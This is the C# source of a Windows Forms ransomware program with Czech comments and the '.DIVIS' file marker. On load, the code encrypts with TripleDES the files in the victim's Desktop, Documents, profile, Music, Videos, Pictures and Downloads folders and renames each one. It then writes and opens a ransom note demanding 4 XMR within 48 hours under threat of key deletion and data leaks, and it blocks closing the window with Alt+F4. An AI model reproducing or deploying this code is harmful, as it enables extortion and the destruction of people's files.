using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Security.Cryptography;
using System.IO;

namespace Ransomware
{
    public partial class Form2 : Form
    {
        public Form2()
        {
            InitializeComponent();
        }

        private void Form2_Load(object sender, EventArgs e)
        {
            //Generace hesla
            
            var chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";   
            var stringChars = new char[16];
            var random = new Random();
            for (int i = 0; i < stringChars.Length; i++)
            {
                stringChars[i] = chars[random.Next(chars.Length)];
            }
            var finalString = new String(stringChars);
            //

            //Generace znaků, která bude přídána k heslu, protože ID uvedené v ransomnotu je heslo k dešifrování
            var charsa = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
            var stringCharsa = new char[34];
            var randoma = new Random();
            for (int a = 0; a < stringChars.Length; a++)
            {
                stringCharsa[a] = charsa[randoma.Next(charsa.Length)];
            }
            var finalStringa = new String(stringCharsa);

            var final = finalString + finalStringa;
            DateTime time = DateTime.Now;

            //

            //


            //SOUBORY NA PLOSE!!!!

            try
            {
                string path = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);

                string[] list = Directory.GetFiles(path, "*.*", SearchOption.AllDirectories);

                foreach (string name_x in list)
                {
                    try
                    {
                        TripleDES tDES = new TripleDES(finalString);
                        tDES.EncryptFile(name_x);
                        string FilePath = name_x;
                        System.IO.Directory.Move(FilePath, FilePath + ".DIVIS");
                    }
                    catch { }


                }
            }
            catch (Exception)
            {

            }


            //Dokumenty

            try
            {
                string path = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
                string[] list = Directory.GetFiles(path);
                foreach (string name_x in list)
                {
                    try
                    {
                        TripleDES tDES = new TripleDES(finalString);
                        tDES.EncryptFile(name_x);
                        string FilePath = name_x;
                        System.IO.Directory.Move(FilePath, FilePath + ".DIVIS");
                    }
                    catch { }
                }
            }
            catch { }


            //USER PROFILE
            try
            {
                string path = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);

                string[] list = Directory.GetFiles(path);
                foreach (string name_x in list)
                {
                    try
                    {
                        TripleDES tDES = new TripleDES(finalString);
                        tDES.EncryptFile(name_x);
                        string FilePath = name_x;
                        System.IO.Directory.Move(FilePath, FilePath + ".DIVIS");
                    }
                    catch { }
                }
            }
            catch { }

            //MUSIC
            try
            {
                string path = Environment.GetFolderPath(Environment.SpecialFolder.MyMusic);
                string[] list = Directory.GetFiles(path);
                foreach (string name_x in list)
                {
                    try
                    {
                        TripleDES tDES = new TripleDES(finalString);
                        tDES.EncryptFile(name_x);
                        string FilePath = name_x;
                        System.IO.Directory.Move(FilePath, FilePath + ".DIVIS");
                    }
                    catch { }
                }
            }
            catch { }

            //VIDEOS
            try
            {
                string path = Environment.GetFolderPath(Environment.SpecialFolder.MyVideos);
                string[] list = Directory.GetFiles(path);
                foreach (string name_x in list)
                {
                    try
                    {
                        TripleDES tDES = new TripleDES(finalString);
                        tDES.EncryptFile(name_x);
                        string FilePath = name_x;
                        System.IO.Directory.Move(FilePath, FilePath + ".DIVIS");
                    }
                    catch { }
                }
            }


            catch { }


            //PICTURES
            try
            {
                string path = Environment.GetFolderPath(Environment.SpecialFolder.MyPictures);
                string[] list = Directory.GetFiles(path);
                foreach (string name_x in list)
                {
                    try
                    {
                        TripleDES tDES = new TripleDES(finalString);
                        tDES.EncryptFile(name_x);
                        string FilePath = name_x;
                        System.IO.Directory.Move(FilePath, FilePath + ".DIVIS");
                    }
                    catch { }
                }
            }
            catch { }
            //DOWNLOADS
            try
            {
                string MachineName1 = Environment.MachineName;
                string fullpath = "C:\\Users\\" + MachineName1 + "\\Downloads";

                string path_ = fullpath;
                string[] list = Directory.GetFiles(path_);
                foreach (string name_x in list)
                {
                    try
                    {
                        TripleDES tDES = new TripleDES(finalString);
                        tDES.EncryptFile(name_x);
                        string FilePath = name_x;
                        System.IO.Directory.Move(FilePath, FilePath + ".DIVIS");
                    }
                    catch { }
                }
            }
            catch { }




            ///////////////////////////////////
            ///


            try
            {
                Directory.CreateDirectory(@"C:/DIVIS");


                using (StreamWriter str = new StreamWriter(@"C:/DIVIS/RANSOMNOTE.txt", true))
                {

                    str.WriteLine("Opss.. Your data was been ENCRYPTED");
                    str.WriteLine("Dont worry. There is two options how you can fix your files!");

                    str.WriteLine("Your time is " + time);
                    str.WriteLine("You have 48 hour to pay, our we delete your Decrypting key and lot of your important files will be uploaded on our shame web");
                    str.WriteLine("");
                    str.WriteLine("Option 1:");
                    str.WriteLine("You can wait for a miracle and for the price to double.");
                    str.WriteLine("");
                    str.WriteLine("Option 2:");
                    str.WriteLine("You will pay us 4 XMR and we send you file DECRYPTOR");
                    str.WriteLine("");
                    str.WriteLine("");
                    str.WriteLine("How can i pay?");
                    str.WriteLine("");
                    str.WriteLine("Constact us on one of this email");
                    str.WriteLine("");
                    str.WriteLine("example@protonmail.com");
                    str.WriteLine("");

                    str.WriteLine("Your personal ID: " + final);
                    str.Flush();
                    System.Diagnostics.Process.Start(@"C:/DIVIS/RANSOMNOTE.txt");
                }
            }
            catch (Exception)
            {

            }


        }

        private void Form2_FormClosing(object sender, FormClosingEventArgs e)
        {
            e.Cancel = true; //Zablokuje vypnutí pomocí altf4
        }
    }
    }
